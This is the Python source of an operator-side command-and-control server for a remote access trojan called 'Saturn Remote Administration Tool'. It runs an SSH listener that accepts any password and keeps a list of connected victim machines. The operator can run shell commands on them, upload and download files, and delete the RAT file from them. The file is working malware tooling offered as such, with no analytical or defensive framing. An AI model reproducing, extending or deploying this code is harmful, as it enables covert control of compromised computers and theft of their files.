#!/usr/bin/env python3
import socket
import threading
import time
import paramiko
import os
import sys
from paramiko.common import OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED, OPEN_SUCCEEDED, AUTH_SUCCESSFUL
from pathlib import Path

HOST = ''
PORT = 2222

CWD = Path(__file__).parent
HOSTKEY = paramiko.RSAKey(filename=CWD / 'rsa.key')

active_clients = {}
clients_lock = threading.Lock()
id_identifier = 0

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind: str, chanid: int):
        if kind == 'session':
            return OPEN_SUCCEEDED
        return OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):
        return AUTH_SUCCESSFUL

def start_management(client_info):
    '''function to manage the specific client'''
    chan = client_info['channel']
    session = client_info['session']
    c_id = client_info['id']

    print(f'\n[+] Management mode started with client with ID: {c_id}')
    print('[+] To go back to the main menu type "back".')

    try:
        while True:
            directory = chan.recv(4096).decode('utf-8').strip()
            if not directory:
                print(f'[-] Client with ID {c_id} disconnected.')
                with clients_lock:
                    if c_id in active_clients: del active_clients[c_id]
                session.close()
                break
            command = input(f'{directory} -< ').strip()
            if not command:
                chan.send(b'keep_alive')
                continue
            if command == 'back':
                print('[+] Going back to the main menu...')
                chan.send(b'keep_alive')
                return
            if command == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                chan.send(b'keep_alive')
                continue
            if command != 'exit' and command != 'delete':
                if command.startswith('upload'):
                    file_name = command[7:].strip().strip("'\"")
                    file_path = Path(CWD / file_name).resolve()

                    if not file_path.exists() or not file_path.is_file():
                        print(f'[-] Error: Local file: {file_name} not found.')
                        chan.send(b'keep_alive')
                        continue

                    with open(file_path, 'rb') as file:
                        file_data = file.read()

                    chan.send(command.encode('utf-8'))
                    chan.sendall(f'{len(file_data)}\n'.encode('utf-8'))
                    chan.sendall(file_data)

                    len_bytes = b''
                    while not len_bytes.endswith(b'\n'):
                        len_bytes += chan.recv(1)
                    data_size = int(len_bytes.decode('utf-8').strip())

                    print(f'Uploading {file_name} ({data_size} bytes)...')

                    result = b''
                    while len(result) < data_size:
                        chunk = chan.recv(data_size - len(result))
                        result += chunk
                    print(result.decode('utf-8', errors='ignore'), end='')
                    continue
                chan.send(command.encode('utf-8'))
                len_bytes = b''
                while not len_bytes.endswith(b'\n'):
                    chunk = chan.recv(1)
                    if not chunk:
                        break
                    len_bytes += chunk
                try:
                    data_size = int(len_bytes.decode('utf-8').strip())
                except ValueError:
                    data_size = 0
                if data_size > 0:
                    if command.startswith('download'):
                        file_name = command[9:].strip().strip("'\"")
                        save_path = Path(CWD / file_name)

                        if data_size < 1000:
                            result = b''
                            while len(result) < data_size:
                                chunk = chan.recv(data_size - len(result))
                                if not chunk:
                                    break
                                result += chunk

                            if result.startswith(b'Error:'):
                                print(result.decode('utf-8', errors='ignore'), end='')
                            else:
                                with open(save_path, 'wb') as file:
                                    file.write(result)
                                print(f'[+] File {file_name} downloaded successfully.\n')
                        else:
                            print(f'Downloading {file_name} ({data_size} bytes)...')
                            bytes_received = 0
                            with open(save_path, 'wb') as file:
                                while bytes_received < data_size:
                                    to_read = min(32768, data_size - bytes_received)
                                    chunk = chan.recv(to_read)
                                    if not chunk:
                                        break
                                    file.write(chunk)
                                    bytes_received += len(chunk)
                            print(f'[+] File {file_name} downloaded successfully.\n')
                    else:
                        result = b''
                        while len(result) < data_size:
                            chunk = chan.recv(data_size - len(result))
                            if not chunk:
                                break
                            result += chunk
                        print(result.decode('utf-8', errors='ignore'), end='')
            else:
                if command == 'exit':
                    chan.send('exit'.encode('utf-8'))
                    print(f'[+] Session with ID {c_id} completely closed.')
                elif command == 'delete':
                    chan.send('delete'.encode('utf-8'))
                    print(f'[+] Session with ID {c_id} completely closed and RAT file deleted.')
                with clients_lock:
                    if c_id in active_clients: del active_clients[c_id]
                chan.close()
                session.close()
                break
    except Exception as e:
        print(f'[-] Management of client with ID {c_id} interrupted with error: {e}')
        with clients_lock:
            if c_id in active_clients: del active_clients[c_id]
        session.close()

def handle_client_connection(client_socket, address):
    '''background function for every new connection'''
    global id_identifier, active_clients
    try:
        bhSession = paramiko.Transport(client_socket)
        bhSession.add_server_key(HOSTKEY)
        server = Server()
        bhSession.start_server(server=server)

        chan = bhSession.accept(20)
        if chan is None:
            print('[-] No connection.')
            sys.exit(1)

        sys_info = chan.recv(1024).decode('utf-8').strip()

        with clients_lock:
            id_identifier += 1
            active_clients[id_identifier] = {'id': id_identifier, 'address': address[0], 'sys_info': sys_info, 'channel': chan, 'session': bhSession}

    except Exception as e:
        print(f'SSH initialization error: {e}')

def accept_connections(server_socket):
    '''endless background cycle for accepting connections'''
    while True:
        try:
            client, address = server_socket.accept()
            t = threading.Thread(target=handle_client_connection, args=(client, address), daemon=True)
            t.start()
        except Exception as e:
            print(f'Accept error: {e}')
            break

def main_menu():
    '''function to choose what to do'''
    while True:
        with clients_lock:
            count = len(active_clients)
            
        print('\n' + '-' * 50)
            
        print('\n===|MAIN MENU|===')
        print('1. Show active devices list')
        print('2. Choose active device to manage by ID')
        print('3. Leave from server')
        print(f'Active connections: {count}')

        choice = input('Choose your option: ')

        if choice == '1':
            with clients_lock:
                if not active_clients:
                    print('\n[-] No active devices.')
                else:
                    print('\n[+] Active devices:')
                    for c_id, info in active_clients.items():
                        print(f'ID [{c_id}] -> {info['sys_info']} ({info['address']})')
        elif choice == '2':
            with clients_lock:
                if not active_clients:
                    print('\n[-] There is no one to manage.')
                    continue
            try:
                chanid = int(input('\n[#] Select ID to manage: '))
                current_client = active_clients.get(chanid)
                if not current_client:
                    print('\n[-] Incorrect ID!')
                else:
                    start_management(current_client)
            except ValueError:
                print('\n[-] Type a number!')
        elif choice == '3':
            print('\n[+] Server shutdown...')
            time.sleep(3)
            sys.exit(0)
        else:
            print('\n[-] Incorrect option.')


def start_server():
    '''function to start server'''
    print('Welcome to Saturn Remote Administration Tool (SRAT)!')
    global id_identifier, active_clients
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST,PORT))
    sock.listen(100)

    print(f'[+] Server started with port: {PORT} Listening for connections...')

    accept_thread = threading.Thread(target=accept_connections, args=(sock,), daemon=True)
    accept_thread.start()

    main_menu()

if __name__ == '__main__':
    start_server()
